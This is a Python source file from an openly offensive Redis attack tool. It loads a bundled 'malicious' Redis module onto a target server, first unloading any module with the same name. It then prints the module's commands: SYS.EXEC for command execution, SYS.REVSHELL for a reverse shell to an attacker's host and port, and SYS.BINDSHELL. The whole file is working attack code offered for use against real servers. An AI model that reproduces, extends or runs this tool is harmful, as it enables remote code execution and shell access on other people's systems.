from .common import proceed_with_cached_connection, decode_bytes_kv_pair, print_kv_pairs, EVIL_MODULE_NAME



def load_malicious_module_help():
    return "\nLoads a Redis module.\n" \
    "The malicious Redis module is already\n" \
    "provided with this tool. All you need\n" \
    "to do is to upload it to the Redis\n" \
    "server and make sure it is executable\n" \
    "and accessible (the user redis-server\n" \
    "is running as must have the permissions\n" \
    "to load the module.)\n"



def load_malicious_module():

    redis = proceed_with_cached_connection()

    module_path = input("\nModule path (on Redis server): ") or None

    if not module_path:
        print ("Missing module path!\n")
        return

    print ("\n[*] Currently loaded modules:")

    for module_info in redis.module_list():

        __module_info = decode_bytes_kv_pair(module_info)

        print_kv_pairs(__module_info)

        if __module_info["name"] == EVIL_MODULE_NAME:
            # Module already loaded? or some other module of same name is loaded!
            # 
            # We won't ask the user here for a simple fact:
            # If they are running this attack, they want to load the malicious module
            # 
            # If the malicious module had already been loaded, there's no point in
            # running this attack...
            print ("\n[*] Unloading module:", __module_info["name"])

            if redis.module_unload(__module_info["name"]):
                print ("[*] Module unloaded successfully!")

    print ("\n[*] Loading module:", module_path)

    if redis.module_load(module_path):
        print ("\n[*] Module loaded successfully!")

        print ("\n[*] Currently loaded modules:")
        for module_info in redis.module_list():
            __module_info = decode_bytes_kv_pair(module_info)
            print_kv_pairs(__module_info)

        print ("\nWith this module loaded, you can now do the following:")
        print ("(1) Execute Commands:     SYS.EXEC <CMD>")
        print ("(2) Obtain Reverse Shell: SYS.REVSHELL <LHOST> <LPORT>")
        print ("(3) Obtain Bind Shell:    SYS.BINDSHELL <RHOST> <RPORT>\n")



if __name__ == "__main__":
    load_malicious_module()